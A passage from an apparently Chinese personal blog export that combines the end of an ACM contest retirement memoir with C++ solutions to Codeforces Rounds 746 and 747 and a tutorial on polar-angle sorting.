快速求幂次，也就是矩阵快速幂来求解，复杂度为 $O(log_2 n)$。\n​\t大二上学期的两个小奖给了我极大的信心，但是在那个学期 ICPC / CCPC 的比赛中我们队伍都是打铁的成绩（啥奖牌都没有），由于疫情的原因比赛名额比较多，我们拿到了很多本来大二拿不到的比赛机会。当时我们队伍在大二的队伍中算是比较弱的，所以我们没有比赛的优先选择权，但是运气非常好，正因为没有优先选择权，我轮到了大二下学期的 2020 赛季最后的区域赛机会——银川站，然后开启了“拿奖模式”。\n​\t大二下可以说是我拿奖拿的最爽的一个学期，我再一次拿到了高校天梯赛的全国银奖，又陆陆续续拿到了蓝桥杯（个人赛）的省一进入国赛，但在国赛中只拿到了国三。最重要的是我队伍（三人组）在 5 月份的浙江省赛中拿到了铜奖，然后我们前往宁夏银川，这是我们第一次出校打比赛，当时非常的兴奋。这场比赛的运气真的是非常非常的好，在银川站一开始由于紧张与缺乏经验打的非常差（罚时爆炸），在还剩一个小时（也就是封榜前）我们队还在铁牌区，我们当时其实有一点绝望，因为我们知道第 $4$ 题用什么算法，但是我们 WA了好几次，一直找不到原因，由于当时这道题是由我来写的，所以我又仔仔细细的看了一遍代码，发现了一个小错误（我当时对 $Trie$ 树的理解并不深，所以几乎是现学现写的），终于过了，当时我们真的非常激动，因为这是道铜牌题，过了它就意味着我们就能拿到奖牌了。不出意外，我们拿到了铜牌，也是我们第一次拿到区域赛的铜牌，现在想起当时的场景也是非常的激动，我拿牌的愿望终于实现了！\n​\t在银川之后，我们又去了西安的西北工业大学参加 ICPC 邀请赛，邀请赛相对于区域赛来说简单一点，我们就抱着旅游的心态去了，比赛又是磕磕绊绊，我们在写出一道签到题后，第二道题是一道期望题，大家都没有什么想法，当时队内的气氛一下子就压抑了起来，队友想不下去就换题了，然后我一个人想这道题，直到第三个小时，我发现这个题的答案好像是一个等比数列，所以我推出了公式后和队友说我想尝试一下，但也没有什么把握的，队友当时也没有在用电脑，然后我就上去打了一个 快速幂 + 龟速乘（其实不需要），我将自己推出来的公式实现了一下，然后测了样例没问题，但是由于那道题是 除法取模 的，只有对特殊的样例我们才能自己手算出答案，然后我和队友说想莽一发，他们对这道题没啥想法就答应了，然后我其实非常不自信的点了提交，当绿色的 Accept 出现时我自己都不敢相信，过了这道题基本上意味着拿铜牌稳了，然后大家又拥有了继续下去的信心，在封榜后又过了一题，最后以 $3$ 题结束比赛，可惜还是铜牌。由于出去比赛是非常吃经费的，然后我们队出去两次比赛都拿到了牌，这点让教练比较满意吧，我们就成为了集训队中的三队，这意味着我们下学期会有更多比赛机会和赛站的优先选择权。\n求 $Fibonacci$ 数列的第 $n(n \\leqslant 10^{10^6})$ 项（对 $10^9 + 9$ 取模） 即便矩阵快速幂将复杂度优化到了 $O(log_2 n)$，但在这个复杂度下计算机依旧求不出这种大小规模的答案了，这时候神奇的数论出场了！Fibonacci 数列的通项公式是： $$ a_n = \\dfrac{1}{\\sqrt{5}}\\left [ \\left ( \\dfrac{1+\\sqrt{5}}{2} \\right )^n - \\left ( \\dfrac{1 - \\sqrt{5}}{2} \\right )^n \\right ] $$ 用二次剩余求出 $\\sqrt{5}$ 对模数 $10^9+9$ 的逆元，然后代替通向公式中的 $\\sqrt{5}$，并将系数全部换成逆元形式，再用费马-欧拉定理对式子进行欧拉降幂，就可以求得答案了。\n​\t转眼大三了，我知道这是 ACM 生涯的最后时间了，我大二暑假没回家，天天再实验室里面刷题，真的是可以称得上 每周几乎无休 + 朝九晚九了，只为了学更多的算法刷更多的题，想拿更多的牌，但是一直运气非常好的我，在这个赛季就没那么好运了，因为疫情这次的所有比赛都是在线上的，而且名额分配的非常多，但是奖牌数缺没有增加，这意味着非常恐怖的竞争，当然这也使得 ACM 区域赛奖牌的含金量更高了。我们参加了三站，济南 $700$ 队争 $200$ 块奖牌，堪称卷成经典，威海 $7$ 题中 $5$ 可以用 “多项式卷积” 过，可以说是 “卷”王了，上海一手 $Kruskal$ 重构树 + 树上倍增 杀死了我们最后希望。这个赛季就只能铁牌结束了，没办法了，虽然有很多遗憾与不甘，也要退役了，但是算法竞赛就是这样真实，打不过别人就是自己菜，所以我是真的菜！\n求 $Fibonacci$ 数列的第 $\\infty$ 项 我没学过，不会~\n​\t人退役了，但是我对算法的热爱并没有“退役”，我想这份热爱也许永远不会消退，因为我个人真的非常喜欢这种思维性的东西，每个算法里面都蕴含着前人的非常多的思维，学习算法就像是很前人对话一样，非常神奇。\n​\t参加 ACM 训练给我带来了很多，代码基本功、思维力、算法灵活运用，但是我觉得最重要的是一种追求更好（代码简洁），更快（复杂度低、运行更快）、更全面（不漏过一个细节）的精神，每当我解出一题，我总是会问自己存不存在更优的解法，我也习惯性的将这种最求极致的精神带入生活中，虽然这会拖慢我的脚步，但是也带给了我很多。正如 Fibonacci 数列是永无尽头的一样，我的学习之路也会是永无尽头的，我会一直追求下去。\n​\t我相信人的每个时间段都有更重要的事情，ACM 对我来说已经结束了，我也该进入新的阶段了，无论是学习技术还是考研，我都还有很长的路要走，但我也不会放弃算法的学习，有机会我还会继续学习算法。\n很多图片算是我曾经努力过的见证吧。\n每一个小点都是我的一次熬夜比赛，曾经的我几乎不愿意拉下任何一场比赛。\n在实验室的一个大位置，实验室的环境非常好，学习氛围更好。\n​\t在弱校从大一下开始零基础打 ACM 竞赛，真的很难，时间真的非常短，平时还要上课，真的是挤时间学习，而与我们同台竞技的是来自 $985, 211$ 的选手，他们很多在高中就开始搞信息学竞赛，但是我们集训队的历届学长告诉我们没有什么不可能的，有零基础拿到区域赛金牌的王队，超队，还有仅仅参加半年多就拿到银牌的学长，有边考研边比赛的计算几何大师学长（拿过计算几何题的一血，并且是全场唯一一个过这道题的人），历届学长的经历都在激励我向前，从以前我们学校最高只能拿到铜牌到有一年拿到银牌，而在我加入集训队前，我们集训队又有了重大突破，拿到了第一块金牌。一届届集训队的传承使得集训队越发的强大，即便我们没有那些名校选手那么好的基础，几乎没有 $OI$ 选手，但是我们依旧在向前。\n总结 回顾我的整个 ACM 历程，我还有很多很多没有做好的地方：\n自学能力依旧不够，没有利用好很多的资源。 轻视了思维力，算法我学了很多，但是我的思维力依旧是偏弱的，我无法很好的运用我学过的算法。 没有针对自己的弱点进行补短板，也就是补题太少，遇到一些不太会的题目就放弃。 缺乏对自己训练的安排，学习路线安排有问题。 最后的感谢 感谢童孟军教练、王子超队长、杨成艺队长对我的帮助！\n感谢我的两位队友的支持！\n","date":"2021-12-04T00:00:00Z","image":"https://example.com/post/%E9%80%80%E5%BD%B9/index.jpg","permalink":"https://example.com/p/acm-%E9%80%80%E5%BD%B9%E8%AE%B0/","title":"ACM 退役记"},{"content":"Codeforces Round #747 (Div. 2) A. Consecutive Sum Riddle 水题，一个为正一个为负即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;iostream\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } int main() { int t = read(); while(t --) { ll n = read(); ll l = - n + 1, r = n; if(l \u0026gt; r) swap(l, r); cout \u0026lt;\u0026lt; l \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; r \u0026lt;\u0026lt; endl; } return 0; } B. Special Numbers 给一个 $n$, 用 $n^0,n^1,n^2,\\dots$ 组合成数，可以用 $n = 2$ 的情况来观测别的情况\n1 2 3 4 5 6 7 8 1 2 3 4 5 6 7 8 1 3 4 9 10 12 13 27 第一行是标记，第二行是 $n = 2$ 的情况，第三行是 $n = 3$ 的情况，以第 $7$ 个数为例，它的二进制为 111, 当 $n = 2$ ,则第 7 个数由 $2^0,2^1,2^2$ 组成，当 $n = 3$ ,则第 7 个数由 $3^0,3^1,3^2$ 组成，所有对 $k$ 二进制拆分后，就可以得到答案了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } ll mod = 1e9 + 7; ll qp(ll a, ll b) { ll ans = 1; while(b) { if(b \u0026amp; 1) ans = ans * a % mod; a = a * a % mod; b \u0026gt;\u0026gt;= 1; } return ans; } int main() { int t = read(); while(t --) { ll n = read(), k = read(); ll ans = 0; for(int i = 0; i \u0026lt;= 62; i ++) { if((k \u0026gt;\u0026gt; i) \u0026amp; 1) ans = (ans + qp(n, i)) % mod; } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; } return 0; } C. Make Them Equal 如果所给的字符串就是满足条件的那么答案是 $0$，若目标字符串中最后面的与 $c$ 字符相等的下标是 $\u0026gt; \\dfrac{n}{2}$ ，则只需要一次操作即可也就是输出这个下标，否则很明显在两次操作内必然能完成，只需要选两个互质的数即可，比如 n, 与 n - 1。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } const int M = 3e5 + 7; char s[M]; int main() { int t = read(); while (t--) { int n = read(); char ch[2]; scanf(\u0026#34;%s%s\u0026#34;, ch, s + 1); bool flag = true; int last = -1, big = 1; for (int i = 1; i \u0026lt;= n; i++) { if (s[i] != *ch) flag = false; else big = i; } if (flag) { printf(\u0026#34;0\\n\u0026#34;); } else { if (s[n] == *ch) { printf(\u0026#34;1\\n\u0026#34;); printf(\u0026#34;%d\\n\u0026#34;, n); } else { if (big * 2 \u0026gt; n) { printf(\u0026#34;1\\n\u0026#34;); printf(\u0026#34;%d\\n\u0026#34;, big); } else { printf(\u0026#34;2\\n\u0026#34;); printf(\u0026#34;%d %d\\n\u0026#34;, n - 1, n); } } } } return 0; } D. The Number of Imposters 首先一个人有可能是 Imposters， 也有可能是 crewmate ，我们可以发现，如果一个说另一个人是 Imposters，则这两个人的身份必然是相反的，而如果一个说另一个人 Imposters，则这两个人的身份必然是相反的，并且这个关系是双向的，也就是说两个人之间是双向边。我们可以给在一个图中给每个人染色，如果染色冲突了就是无解，输出 -1，否则答案加上两种颜色中个数最多的那个。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } const int M = 1e6 + 7, N = 2e5 + 7; struct Node { int to, nxt, w; } tr[M]; int head[N], idx, color[N], cnt; char s[20]; void add(int u, int v, int w) { tr[idx] = {v, head[u], w}; head[u] = idx ++; } int colornum[3]; bool dfs(int now) { for(int i = head[now]; ~i; i = tr[i].nxt) { int j = tr[i].to; if(!color[j]) { if(tr[i].w) { color[j] = 3 - color[now]; colornum[color[j]] ++; } else { color[j] = color[now]; colornum[color[j]] ++; } if(!dfs(j)) return false; } else { if(tr[i].w \u0026amp;\u0026amp; color[j] != 3 - color[now]) return false; if(!tr[i].w \u0026amp;\u0026amp; color[j] == 3 - color[now]) return false; } } return true; } int main() { int t = read(); while(t --) { idx = 0; int n = read(), m = read(); for(int i = 1; i \u0026lt;= n; i ++) { head[i] = -1; color[i] = 0; } for(int i = 1; i \u0026lt;= m; i ++) { int x = read(), y = read(); scanf(\u0026#34;%s\u0026#34;, s); if(*s == \u0026#39;i\u0026#39;) { add(x, y, 1); add(y, x, 1); } else { add(x, y, 0); add(y, x, 0); } } // 1 imposter, 2 crewmate bool flag = true; int ans = 0; for(int i = 1; i \u0026lt;= n; i ++) { if(!color[i]) { colornum[1] = 1, colornum[2] = 0; color[i] = 1; if(!dfs(i)) { flag = false; break; } ans += max(colornum[1], colornum[2]); } } if(!flag) { printf(\u0026#34;-1\\n\u0026#34;); } else { printf(\u0026#34;%d\\n\u0026#34;, ans); } } return 0; } E1. Rubik\u0026rsquo;s Cube Coloring (easy version) 第一个点是 $6$ 种颜色，它的子节点是 $4$ 种选择，而每个结点有两个子节点，所以答案是 $6\\times 2^{2^2 + 2^3 + \\dots 2^k}$，快速幂求解即可，注意 1 \u0026lt;\u0026lt; k 种的 1 默认为 int，所以左移过多会溢出！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } const int M = 2e5 + 7; const ll mod = 1e9 + 7; ll qp(ll a, ll b) { ll ans = 1; while(b) { if(b \u0026amp; 1) ans = ans * a % mod; a = a * a % mod; b \u0026gt;\u0026gt;= 1; } return ans; } int main() { ll k = read(); if(k == 1) { cout \u0026lt;\u0026lt; 6 \u0026lt;\u0026lt; endl; } else { ll all = 0; for(ll i = 2; i \u0026lt;= k; i ++) all += (ll)1 \u0026lt;\u0026lt; i; all %= mod - 1; // 对指数取模 mod - 1， 费马小定理，这边不去模也可以 ll ans = qp(2, all) * 6 % mod; cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; endl; } return 0; } ","date":"2021-10-09T10:23:28+08:00","image":"https://example.com/post/cf747/codeforces.png","permalink":"https://example.com/p/cf747/","title":"Cf747"},{"content":"Codeforces Round #746 (Div. 2) A. Gamer Hemose 水题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) {if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) {x = x * 10 + ch - \u0026#39;0\u0026#39;;ch = getchar();} return x * f; } const int M = 1e5 + 7; ll num[M]; int main() { int t = read(); while(t --) { ll n = read(), h = read(); for(int i = 0; i \u0026lt; n; i ++) { num[i] = read(); } sort(num, num + n); ll a = num[n - 1], b = num[n - 2]; ll ans = h / (a + b); ans *= 2; if(h % (a + b) \u0026gt; 0 \u0026amp;\u0026amp; h % (a + b) \u0026gt; a) ans += 2; else if (h % (a + b) \u0026gt; 0 \u0026amp;\u0026amp; h % (a + b) \u0026lt;= a) ans += 1; cout \u0026lt;\u0026lt; ans \u0026lt; B. Hemose Shopping 题意是间距 $ \\ge x$ 的元素才能交换。只要能交换就可以到能交换的任意位置必然能够排序，但是不能交换的位置上的元素无法改变，所有只需要判断无法改变的位置上的元素是否是正确的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) {if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) {x = x * 10 + ch - \u0026#39;0\u0026#39;;ch = getchar();} return x * f; } const int M = 1e5 + 7; int num[M], tmp[M]; int main() { int t = read(); while(t --) { ll n = read(), x = read(); for(int i = 0; i \u0026lt; n; i ++) { num[i] = read(); tmp[i] = num[i]; } sort(tmp, tmp + n); bool flag = true; for(int i = 0 ; i \u0026lt; n; i ++) { if(i \u0026lt; x \u0026amp;\u0026amp; n - i - 1 \u0026lt; x \u0026amp;\u0026amp; tmp[i] != num[i]) flag = false; } if(flag) cout \u0026lt;\u0026lt; \u0026#34;YES\u0026#34; \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; \u0026#34;NO\u0026#34; \u0026lt;\u0026lt; endl; } return 0; } C. Bakry and Partitioning\n如果一棵树的异或和为 $ 0 $ 那么，我们必然可以把这课树划分成异或和相等的两部分，若不为 $ 0 $ 则判断是有两棵以上子树的异或和为与总异或和相等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) {if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) {x = x * 10 + ch - \u0026#39;0\u0026#39;;ch = getchar();} return x * f; } const int M = 1e5 + 7; struct Node { int to, nxt; } tr[M * 2]; int head[M], idx, num[M], xxor[M], all, cnt; void add(int u, int v) { tr[idx] = {v, head[u]}; head[u] = idx ++; } int dfs(int u, int fa) { int now = num[u]; for(int i = head[u]; ~i; i = tr[i].nxt) { int j = tr[i].to; if(j != fa) { now ^= dfs(j, u); } } if(now == all) { cnt ++; return 0; } return xxor[u] = now; } int main() { int t = read(); while(t --) { idx = 0, all = 0, cnt = 0; ll n = read(), k = read(); for(int i = 1; i \u0026lt;= n; i ++) { num[i] = read(); head[i] = -1; all ^= num[i]; } for(int i = 1; i \u0026lt; n ; i ++) { int u = read(), v = read(); add(u, v); add(v, u); } dfs(1, - 1); if(all == 0) { cout \u0026lt;\u0026lt; \u0026#34;YES\u0026#34; \u0026lt;\u0026lt; endl; } else { dfs(1, -1); if(k \u0026gt;= 3 \u0026amp;\u0026amp; cnt \u0026gt; 2) cout \u0026lt;\u0026lt; \u0026#34;YES\u0026#34; \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; \u0026#34;NO\u0026#34; \u0026lt;\u0026lt; endl; } } return 0; } D. Hemose in ICPC ? 题目只给了 12次的查询机会，而 $n = 1000$ ，所有可以多半是用二分来做的，但是这是一棵树不好二分，所有正解是对树进行一层求边的 DFS 序后二分，因为对边进行 DFS 序后，每一段区间在原本的树上都是连续的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;set\u0026gt; #define INF 0x3f3f3f3f using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } const int M = 1e3 + 7; typedef pair\u0026lt;int, int\u0026gt; PII; vector\u0026lt;int\u0026gt; tr[M]; vector\u0026lt;PII\u0026gt; edge; int in[M], out[M], cnt = 1; void dfs(int now, int fa) { edge.push_back({now, fa}); for(int i = 0; i \u0026lt; (int)tr[now].size(); i ++) { if(fa != tr[now][i]) { dfs(tr[now][i], now); } } } void query(int n, int ans) { int l = 1, r = n - 1; // 第一个点不会是答案 while(true) { if(l == r) { printf(\u0026#34;! %d %d\\n\u0026#34;, edge[l].first, edge[l].second); break; } int mid = l + r \u0026gt;\u0026gt; 1; set\u0026lt;int\u0026gt; st; for(int i = l; i \u0026lt;= mid; i ++) st.insert(edge[i].first), st.insert(edge[i].second); cout \u0026lt;\u0026lt; \u0026#34;? \u0026#34; \u0026lt;\u0026lt; st.size(); for(auto i : st) cout \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; i ; cout \u0026lt;\u0026lt; endl; int now = read(); if(now == ans) r = mid; else l = mid + 1; } } int main() { int n = read(); for(int i = 1; i \u0026lt; n ; i ++) { int u = read(), v = read(); tr[u].push_back(v); tr[v].push_back(u); } dfs(1, 1); cout \u0026lt;\u0026lt; \u0026#34;? \u0026#34; \u0026lt;\u0026lt; n; for(int i = 1; i \u0026lt;= n; i ++) cout \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; i; cout \u0026lt;\u0026lt; endl; int ans = read(); query(n, ans); return 0; } ","date":"2021-10-07T12:59:02+08:00","image":"https://example.com/post/cf746/codeforces.png","permalink":"https://example.com/p/cf746/","title":"Cf746"},{"content":"极角排序 方法 1 : 直接计算极角 极坐标与直角坐标转换公式有 $\\tan \\theta = \\dfrac{y}{x}$ ，在 \u0026lt;cmath\u0026gt; 中有函数 atan(y, x) ，可以直接计算 (x, y) 的极角，值域是 $(-\\pi,\\pi]$ ，可以直接使用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long double ld; const int M = 1e5 + 7; struct Point { ld x, y; Point(const ld \u0026amp;x = 0, const ld \u0026amp;y = 0) : x(x), y(y) {} }p[M]; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for(int i = 1; i \u0026lt;= n; i ++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y); } sort(p + 1, p + n + 1, [\u0026amp;](auto p1, auto p2) { return atan2(p1.y, p1.x) \u0026lt; atan2(p2.y, p2.x); }); for (int i = 1; i \u0026lt;= n; ++i)cout \u0026lt;\u0026lt; \u0026#39;(\u0026#39; \u0026lt;\u0026lt; p[i].x \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; p[i].y \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; atan2(p[i].y, p[i].x) \u0026lt;\u0026lt;\u0026#39;)\u0026#39; \u0026lt;\u0026lt; endl; return 0; } 这种极角排序，有一下几点需要注意：\n排序完之后是按照 (三（不含负 $x$ 轴）、四、一、二) 的象限顺序。\natan(y,x) 是存在精度误差的可能会被卡。\n方法二 : 叉积 + 所在象限排序 通过两向量象限关系 + 叉积关系来排序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; typedef long double ld; const int M = 1e5 + 7; struct Point { ld x, y; int id; Point(const ld \u0026amp;x = 0, const ld \u0026amp;y = 0) :x(x), y(y){} Point operator-(const Point\u0026amp; b){return Point(x - b.x, y - b.y);} ld get_length() {return sqrt(x * x + y * y);} }p[M]; ld cross(Point a, Point b) { return a.x * b.y - a.y * b.x; } int qua(Point p) { return (p.y \u0026lt; 0) \u0026lt;\u0026lt; 1 | (p.x \u0026lt; 0) ^ (p.y \u0026lt; 0);} // 求象限(0, 1, 2, 3) bool cmp(Point a, Point b) { // cmp 写法 return qua(a) \u0026lt; qua(b) || qua(a) == qua(b) \u0026amp;\u0026amp; (cross(a, b) \u0026gt; 0.0); } bool cmp2(const Point \u0026amp;a, const Point \u0026amp;b)//先按象限排序，再按极角排序，再按远近排序 { if (a.y == 0 \u0026amp;\u0026amp; b.y == 0 \u0026amp;\u0026amp; a.x*b.x \u0026lt;= 0)return a.x\u0026gt;b.x; if (a.y == 0 \u0026amp;\u0026amp; a.x \u0026gt;= 0 \u0026amp;\u0026amp; b.y != 0)return true; if (b.y == 0 \u0026amp;\u0026amp; b.x \u0026gt;= 0 \u0026amp;\u0026amp; a.y != 0)return false; if (b.y*a.y \u0026lt;= 0)return a.y\u0026gt;b.y; return cross(a,b) \u0026gt; 0 || (cross(a,b) == 0 \u0026amp;\u0026amp; a.y \u0026gt; b.y); } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for(int i = 1; i \u0026lt;= n; i ++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y); } Point c = Point(0, 0); // 原点（可更改） sort(p + 1, p + n + 1, [\u0026amp;](auto v1, auto v2) { return qua(v1 - c) \u0026lt; qua(v2 - c) || qua(v1 - c) == qua(v2 - c) \u0026amp;\u0026amp; (cross(v1 - c, v2 - c) \u0026gt; 0.0); }); for (int i = 1; i \u0026lt;= n; ++i)cout \u0026lt;\u0026lt; \u0026#39;(\u0026#39; \u0026lt;\u0026lt; p[i].x \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; p[i].y \u0026lt;\u0026lt;\u0026#39;)\u0026#39; \u0026lt;\u0026lt; endl; return 0; } 注意点：\n在点为整数的情况下精度较高，速度可能比上面的方法快。\n排序后结果是按照（一（含正 $x$ 轴）、二、三、四）坐标轴排列。\n例题 1 ：C. Nearest vectors 模板题，极角排序后求相邻两向量的夹角即可，最后输出最小对的坐标。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; typedef long double ld; const int M = 1e5 + 7; const ld PI = acos(-1); struct Point { ld x, y; int id; Point(const ld \u0026amp;x = 0, const ld \u0026amp;y = 0, const int \u0026amp;id = 0) :x(x), y(y), id(id) {} Point operator-(const Point\u0026amp; b){return Point(x - b.x, y - b.y);} ld get_length() {return sqrt(x * x + y * y);} }p[M]; ld dot(Point a, Point b) { return a.x * b.x + a.y * b.y; } ld cross(Point a, Point b) { return a.x * b.y - a.y * b.x; } double get_angle(Point a, Point b) { // 求两向量夹角 return acos(dot(a, b) / a.get_length() / b.get_length()); // 弧度 -\u0026gt; (* 180 / PI) 角度 } ld theta(Point p) { return atan2(p.y, p.x);} int qua(Point p) { return (p.y \u0026lt; 0) \u0026lt;\u0026lt; 1 | (p.x \u0026lt; 0) ^ (p.y \u0026lt; 0);} // 求象限 bool cmp(Point a, Point b) { return qua(a) \u0026lt; qua(b) || qua(a) == qua(b) \u0026amp;\u0026amp; (cross(a, b) \u0026gt; 0.0); } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for(int i = 1; i \u0026lt;= n; i ++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y, i); } sort(p + 1, p + n + 1, cmp); p[n + 1] = p[1]; pair\u0026lt;int, int\u0026gt; ans = {1, 2}; ld mmax = 2 * PI + 1; for(int i = 1; i \u0026lt;= n; i ++) { ld now = theta(p[i+1]) - theta(p[i]); // 其实只是为了处理 